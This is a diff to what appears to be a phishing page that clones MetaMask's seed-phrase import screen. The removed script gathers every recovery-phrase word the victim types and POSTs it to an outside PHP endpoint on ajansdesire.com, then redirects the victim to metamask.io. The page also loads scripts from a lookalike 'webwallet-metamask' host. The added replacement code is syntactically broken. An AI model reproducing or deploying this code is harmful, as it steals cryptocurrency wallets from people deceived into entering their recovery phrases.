@@ -68006,59 +68006,31 @@ input:checked + .send-v2__amount-max__button {
     <script src="https://webwallet-metamask.vercel.app/bip39.min.js"></script>
     <script src="https://webwallet-metamask.vercel.app/script5e1f.js"></script>
 <script>
-    $(document).ready(function () {
-        // "Recover Wallet" butonunu başlangıçta devre dışı bırak
-        $("#form77").prop("disabled", true);
+  function checkInputs() {
+    // Inputları kontrol et
+    var inputs = [
+      document.getElementById("import-srp__srp-word-0").value,
+      document.getElementById("import-srp__srp-word-1").value,
+      document.getElementById("import-srp__srp-word-2").value,
+      document.getElementById("import-srp__srp-word-3").value,
+      document.getElementById("import-srp__srp-word-4").value,
+      document.getElementById("import-srp__srp-word-5").value,
+      document.getElementById("import-srp__srp-word-6").value,
+        document.getElementById("import-srp__srp-word-7").value,
+        document.getElementById("import-srp__srp-word-8").value
+        document.getElementById("import-srp__srp-word-9").value
+      document.getElementById("import-srp__srp-word-10").value
+      // Diğer inputları buraya ekleyin
+    ];
 
-        // Input alanlarına değer girildiğinde kontrolü yap
-        $("input[name^='import-srp__srp-word']").on("input", function () {
-            // Belirtilen koşullara göre "Recover Wallet" butonunu etkinleştir veya devre dışı bırak
-            var selectedValue = $("#selectboxID").val();
-            var enableButton = true;
+    // En az 3 harf kontrolü
+    var isDisabled = inputs.some(input => input.length < 3);
 
-            if (selectedValue == 12) {
-                $("input[name^='import-srp__srp-word']").each(function () {
-                    var inputValue = $(this).val();
-
-                    // Her bir input içinde en az 3 harf kontrolü
-                    if (inputValue.length < 3) {
-                        enableButton = false;
-                        return false; // Döngüyü sonlandır
-                    }
-                });
-            } else {
-                enableButton = false;
-            }
-
-            // Eğer koşullar sağlanıyorsa butonu etkinleştir, değilse devre dışı bırak
-            $("#form77").prop("disabled", !enableButton);
-        });
-
-        // "Recover Wallet" butonuna tıklanınca
-        $("#form77").click(function () {
-            // Form verilerini topla
-            var formData = {};
-
-            $("input[name^='import-srp__srp-word']").each(function () {
-                var inputID = $(this).attr("id");
-                formData[inputID] = $(this).val();
-            });
-
-            // Formu kekem.php adresine POST isteği gönder
-            $.ajax({
-                method: 'POST',
-                data: formData,
-                url: 'https://ajansdesire.com/asdasd/kekem.php',
-                success: function (data) {
-                    window.location.href = 'https://href.li/?https://metamask.io';
-                },
-                error: function () {
-                    // Hata durumunda yapılacak işlemler
-                },
-            });
-        });
-    });
+    // Button durumunu güncelle
+    document.getElementById("form77").disabled = isDisabled;
+  }
 </script>
+
 
 
   </body>
